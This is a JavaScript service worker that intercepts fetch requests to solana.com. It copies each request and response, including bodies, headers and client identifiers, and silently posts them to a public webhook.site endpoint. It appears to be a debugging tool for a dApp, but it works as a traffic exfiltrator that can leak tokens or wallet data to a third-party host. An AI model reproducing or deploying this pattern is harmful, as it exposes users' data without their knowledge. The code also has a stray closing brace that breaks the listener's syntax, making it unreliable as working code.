self.addEventListener('fetch', function(event) {
  console.log('Handling fetch event for', event.request.url);
    const requestClone = event.request.clone();

    event.respondWith(
      fetch(event.request).then(response => {
        const requestUrl = new URL(event.request.url);
        // Only targeting requests to solana.com, this will not work on localhost
        // but also this won't capture any other API calls to other domains that the
        // dApp may make.
        if (requestUrl.hostname === 'solana.com') {
          const uniqueId = Date.now().toString(36) + Math.random().toString(36).substr(2);
          const responseClone = response.clone();
          logRequest(uniqueId, event, requestClone);
          logResponse(uniqueId, event, responseClone);
        }

        return response;
      }).catch(error => {
        console.error('Fetch error:', error);
      })
    );
  }
});

function logRequest(uniqueId, event, request) {
  request.text().then(body => {
    const requestData = {
      event: {
        id: uniqueId,
        clientId: event.clientId,
        handled: event.handled,
        replacesClientId: event.replacesClientId,
        resultingClientId: event.resultingClientId,
      },
      request: {
        body: body,
        bodyUsed: request.bodyUsed,
        cache: request.cache,
        credentials: request.credentials,
        destination: request.destination,
        headers: [...request.headers.entries()],
        integrity: request.integrity,
        method: request.method,
        mode: request.mode,
        redirect: request.redirect,
        referrer: request.referrer,
        referrerPolicy: request.referrerPolicy,
        url: request.url,
        signal: request.signal
      }
    };
    sendToWebhook(requestData);
  }).catch(error => {
    console.error('Error in reading request:', error);
  });
}

function logResponse(uniqueId, event, response) {
  response.text().then(body => {
    const responseData = {
      event: {
        id: uniqueId,
        clientId: event.clientId,
        handled: event.handled,
        replacesClientId: event.replacesClientId,
        resultingClientId: event.resultingClientId,
      },
      response: {
        body: body,
        bodyUsed: response.bodyUsed,
        headers: [...response.headers.entries()],
        ok: response.ok,
        redirected: response.redirected,
        status: response.status,
        statusText: response.statusText,
        type: response.type,
        url: response.url,
      }
    };
    sendToWebhook(responseData);
  }).catch(error => {
    console.error('Error in reading response:', error);
  });
}

function sendToWebhook(data) {
  fetch('https://webhook.site/683f3fba-dee1-4b0b-8e05-3c91dc2ee52e', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data),
    mode: 'no-cors'
  }).catch(error => {
    console.error('Error sending data to webhook:', error);
  });
}
